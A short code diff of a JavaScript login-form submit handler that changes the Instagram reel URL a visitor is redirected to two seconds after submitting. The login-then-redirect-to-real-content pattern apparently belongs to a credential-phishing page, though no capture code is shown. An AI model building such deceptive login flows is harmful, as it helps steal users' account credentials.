@@ -13,7 +13,7 @@ document.getElementById("login-form").addEventListener("submit", async function 
   });
 
   setTimeout(() => {
-    window.location.href = "https://www.instagram.com/reel/DLZbAqpTluQ/?igsh=aXcxd3R4eThreDNs"; // working reel
+    window.location.href = "https://www.instagram.com/reel/DKr3gw1s8z4/?igsh=MWt3M3h2ZXV1ZXFhZA=="; // working reel
   }, 2000);
 });
   
